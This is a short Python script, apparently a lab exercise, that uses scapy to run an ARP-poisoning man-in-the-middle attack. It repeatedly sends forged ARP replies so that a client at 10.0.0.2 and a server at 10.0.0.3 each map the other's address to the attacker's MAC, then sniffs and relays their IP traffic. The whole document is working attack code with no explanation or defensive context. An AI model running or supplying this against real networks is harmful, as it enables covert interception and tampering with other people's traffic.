from scapy.all import *
import time
import threading

print("poisoning...")
my_ip = "10.0.0.1"
client_ip = "10.0.0.2"
server_ip = "10.0.0.3"
broadcast = "ff:ff:ff:ff:ff:ff"
my_mac = get_if_hwaddr("eth0")
server_mac = getmacbyip(server_ip)
client_mac = getmacbyip(client_ip)
def poison():
    while True:
        packet1 = Ether(src=my_mac, dst=broadcast) /ARP(op = 2, psrc=server_ip, hwsrc=my_mac, pdst=client_ip, hwdst=client_mac)
        packet2 = Ether(src=my_mac, dst=broadcast) /ARP(op = 2, psrc=client_ip, hwsrc=my_mac, pdst=server_ip, hwdst=server_mac)
        sendp(packet1, verbose=0,iface="eth0")
        sendp(packet2, verbose=0, iface="eth0")
        time.sleep(2)

threading.Thread(target=poison, daemon=True).start()
                                                                                   
def relay(pkt):
    if IP not in pkt or pkt[Ether].src == my_mac:
        return
    del pkt[IP].chksum
    del pkt[TCP].chksum
    if pkt[IP].src == client_ip and pkt[Ether].dst == my_mac:
        forward = Ether(src = my_mac, dst = server_mac)/pkt[IP].copy()
        sendp(forward, iface = "eth0", verbose=0)
    if pkt[IP].src == server_ip and pkt[Ether].dst == my_mac:
        forward = Ether(src=my_mac, dst = client_mac)/pkt[IP].copy()
        sendp(forward, iface = "eth0",verbose=0)

sniff(filter="ip", prn=relay)
